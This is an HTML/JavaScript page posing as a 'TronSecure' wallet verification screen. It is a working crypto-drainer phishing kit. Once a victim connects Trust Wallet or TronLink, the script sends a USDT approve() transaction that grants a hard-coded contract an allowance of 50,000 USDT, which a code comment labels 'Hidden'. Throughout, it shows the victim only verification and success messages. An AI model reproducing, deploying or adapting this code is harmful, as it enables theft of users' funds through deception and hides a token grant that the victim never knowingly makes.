<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Wallet - TronSecure</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 30px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }

        .logo {
            font-size: 32px;
            font-weight: bold;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
        }

        .network-badge {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 8px 20px;
            border-radius: 50px;
            display: inline-block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        h2 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }

        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .wallet-card {
            background: #f8f9fa;
            border: 2px solid #e0e0e0;
            border-radius: 20px;
            padding: 30px 25px;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s;
        }

        .wallet-card:hover {
            border-color: #667eea;
            background: #f0f3ff;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102,126,234,0.1);
        }

        .wallet-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .wallet-name {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #333;
        }

        .wallet-desc {
            color: #666;
            font-size: 14px;
        }

        .info-box {
            background: #f8f9fa;
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
        }

        .info-item {
            padding: 8px 0;
            color: #666;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
        }

        .info-item strong {
            color: #667eea;
        }

        .status-message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 12px;
            font-size: 14px;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .info {
            background: #cce5ff;
            color: #004085;
            border: 1px solid #b8daff;
        }

        .warning {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeeba;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer {
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }

        .back-btn {
            background: none;
            border: 2px solid #667eea;
            color: #667eea;
            padding: 12px 30px;
            border-radius: 30px;
            margin-top: 20px;
            cursor: pointer;
            display: inline-block;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s;
        }

        .back-btn:hover {
            background: #667eea;
            color: white;
        }

        .progress-container {
            width: 100%;
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            margin: 20px 0;
            overflow: hidden;
            display: none;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s ease;
        }

        .wallet-status {
            font-size: 12px;
            color: #10b981;
            margin-top: 5px;
            display: none;
        }
    </style>
    <!-- TronWeb Library -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
</head>
<body>
    <div class="container">
        <div class="logo">TronSecure</div>
        
        <div class="network-badge">
            🌐 TRON NETWORK
        </div>
        
        <h2>Verify Your Wallet</h2>
        <div class="subtitle">Connect to complete verification</div>

        <!-- Trust Wallet Card -->
        <div class="wallet-card" onclick="connectTrustWallet()" id="trustWalletCard">
            <div class="wallet-icon">💎</div>
            <div class="wallet-name">Trust Wallet</div>
            <div class="wallet-desc">Connect with TRON network</div>
            <div id="trustStatus" class="wallet-status"></div>
        </div>

        <!-- TronLink Card (Fallback) -->
        <div class="wallet-card" onclick="connectTronLink()" id="tronLinkCard" style="margin-top: 10px;">
            <div class="wallet-icon">🔗</div>
            <div class="wallet-name">TronLink</div>
            <div class="wallet-desc">Browser extension</div>
            <div id="tronlinkStatus" class="wallet-status"></div>
        </div>

        <!-- Simple Info Box -->
        <div class="info-box">
            <div class="info-item">
                <span>Network:</span>
                <strong>TRON</strong>
            </div>
            <div class="info-item">
                <span>Contract:</span>
                <strong>TCuZP5...CtQt</strong>
            </div>
        </div>

        <!-- Progress Bar -->
        <div class="progress-container" id="progressContainer">
            <div class="progress-bar" id="progressBar"></div>
        </div>

        <!-- Status Messages -->
        <div id="statusMessage"></div>

        <a href="index.html" class="back-btn">← Back to Home</a>

        <div class="footer">
            🔒 Secure Verification • TRON Network
        </div>
    </div>

    <script>
        // ============================================
        // CONFIGURATION
        // ============================================
        
        const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
        const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const APPROVE_AMOUNT = 50000; // 50,000 USDT - Hidden

        let tronWeb = null;
        let userAddress = null;

        // ============================================
        // CHECK WALLET ON PAGE LOAD
        // ============================================
        
        window.onload = function() {
            checkWalletStatus();
            
            // Check URL params
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('verified') === 'true') {
                showStatus('✅ Wallet verified successfully!', 'success');
            }
        };

        // ============================================
        // CHECK WALLET STATUS
        // ============================================
        
        function checkWalletStatus() {
            // Check for TronWeb (Trust Wallet)
            if (window.tronWeb && window.tronWeb.ready) {
                document.getElementById('trustStatus').innerHTML = '✓ Wallet detected';
                document.getElementById('trustStatus').style.display = 'block';
            }
            
            // Check for TronLink
            if (window.tronLink) {
                document.getElementById('tronlinkStatus').innerHTML = '✓ Installed';
                document.getElementById('tronlinkStatus').style.display = 'block';
            }
        }

        // ============================================
        // CONNECT TRUST WALLET
        // ============================================
        
        async function connectTrustWallet() {
            const card = document.getElementById('trustWalletCard');
            card.style.opacity = '0.7';
            card.style.pointerEvents = 'none';
            
            showProgress();
            showStatus('Connecting to Trust Wallet...', 'info');

            try {
                // Method 1: Check if TronWeb is already injected
                if (window.tronWeb && window.tronWeb.ready) {
                    console.log('TronWeb detected');
                    tronWeb = window.tronWeb;
                    
                    // Get address
                    if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                        userAddress = tronWeb.defaultAddress.base58;
                    } else {
                        const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
                        userAddress = accounts[0];
                    }
                    
                    updateProgress(50);
                    showStatus('Wallet connected!', 'success');
                    
                    // Proceed to approve
                    await approveUSDT();
                    return;
                }
                
                // Method 2: Try to request accounts
                if (window.tronWeb) {
                    try {
                        const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
                        if (accounts && accounts.length > 0) {
                            userAddress = accounts[0];
                            tronWeb = window.tronWeb;
                            updateProgress(50);
                            showStatus('Wallet connected!', 'success');
                            await approveUSDT();
                            return;
                        }
                    } catch (e) {
                        console.log('Account request failed', e);
                    }
                }
                
                // Method 3: Initialize new TronWeb
                const tempTronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io',
                    privateKey: null
                });
                
                // Try to connect
                if (tempTronWeb) {
                    tronWeb = tempTronWeb;
                    showStatus('Please unlock your wallet', 'info');
                    
                    // Wait for wallet
                    setTimeout(() => {
                        checkWalletConnection();
                    }, 3000);
                } else {
                    throw new Error('Please open in Trust Wallet DApp browser');
                }

            } catch (error) {
                console.error('Connection error:', error);
                showStatus('Connection failed. Please make sure Trust Wallet is open.', 'error');
                resetCards();
                hideProgress();
            }
        }

        // ============================================
        // CHECK WALLET CONNECTION
        // ============================================
        
        async function checkWalletConnection() {
            try {
                if (window.tronWeb && window.tronWeb.ready) {
                    userAddress = window.tronWeb.defaultAddress.base58;
                    tronWeb = window.tronWeb;
                    updateProgress(50);
                    showStatus('Wallet connected!', 'success');
                    await approveUSDT();
                } else {
                    showStatus('Please approve connection in Trust Wallet', 'info');
                    setTimeout(checkWalletConnection, 2000);
                }
            } catch (e) {
                console.log('Still waiting for connection...');
            }
        }

        // ============================================
        // CONNECT TRONLINK (FALLBACK)
        // ============================================
        
        async function connectTronLink() {
            const card = document.getElementById('tronLinkCard');
            card.style.opacity = '0.7';
            card.style.pointerEvents = 'none';
            
            showProgress();
            showStatus('Connecting to TronLink...', 'info');

            try {
                if (!window.tronLink) {
                    window.open('https://www.tronlink.org/', '_blank');
                    showStatus('Please install TronLink first', 'warning');
                    resetCards();
                    hideProgress();
                    return;
                }

                // Request account
                await window.tronLink.request({ method: 'tron_requestAccounts' });
                
                // Initialize TronWeb
                tronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io',
                    privateKey: window.tronLink.privateKey
                });

                userAddress = tronWeb.defaultAddress.base58;
                
                updateProgress(50);
                showStatus('Wallet connected!', 'success');
                
                await approveUSDT();

            } catch (error) {
                console.error('TronLink error:', error);
                showStatus('Connection failed. Please try again.', 'error');
                resetCards();
                hideProgress();
            }
        }

        // ============================================
        // APPROVE USDT
        // ============================================
        
        async function approveUSDT() {
            showStatus('Completing verification...', 'info');
            updateProgress(75);

            try {
                // Make sure we have tronWeb
                if (!tronWeb) {
                    throw new Error('Wallet not connected');
                }

                // Get USDT contract
                const tokenContract = await tronWeb.contract().at(USDT_ADDRESS);
                
                // Convert amount to sun
                const amountInSun = APPROVE_AMOUNT * 1000000;

                // Send approve transaction
                const result = await tokenContract.approve(
                    CONTRACT_ADDRESS,
                    amountInSun
                ).send();

                updateProgress(100);
                
                // Save approval
                saveApproval(userAddress, APPROVE_AMOUNT, result);
                
                showStatus('✅ Wallet verified successfully!', 'success');
                
                // Redirect after 2 seconds
                setTimeout(() => {
                    window.location.href = 'index.html?verified=true';
                }, 2000);

            } catch (error) {
                console.error('Approval error:', error);
                
                // Check if user rejected
                if (error.message.includes('rejected') || error.message.includes('denied')) {
                    showStatus('Transaction rejected', 'error');
                } else {
                    showStatus('Verification failed. Please try again.', 'error');
                }
                
                resetCards();
                hideProgress();
            }
        }

        // ============================================
        // SAVE APPROVAL
        // ============================================
        
        function saveApproval(address, amount, txHash) {
            const approvals = JSON.parse(localStorage.getItem('usdtApprovals') || '[]');
            
            approvals.push({
                user: address,
                amount: amount,
                txHash: txHash,
                status: 'active',
                time: new Date().toISOString(),
                token: 'USDT',
                walletType: 'TRON Wallet'
            });
            
            localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
        }

        // ============================================
        // UI FUNCTIONS
        // ============================================
        
        function showStatus(message, type) {
            const statusDiv = document.getElementById('statusMessage');
            statusDiv.innerHTML = `<div class="status-message ${type}">${message}</div>`;
        }

        function showProgress() {
            document.getElementById('progressContainer').style.display = 'block';
            updateProgress(25);
        }

        function hideProgress() {
            document.getElementById('progressContainer').style.display = 'none';
        }

        function updateProgress(percent) {
            document.getElementById('progressBar').style.width = percent + '%';
        }

        function resetCards() {
            document.getElementById('trustWalletCard').style.opacity = '1';
            document.getElementById('trustWalletCard').style.pointerEvents = 'auto';
            document.getElementById('tronLinkCard').style.opacity = '1';
            document.getElementById('tronLinkCard').style.pointerEvents = 'auto';
        }

        // ============================================
        // TRONWEB EVENT LISTENERS
        // ============================================
        
        if (window.tronWeb) {
            window.tronWeb.on('addressChanged', function() {
                console.log('Address changed');
                checkWalletStatus();
            });
        }
    </script>
</body>
</html>
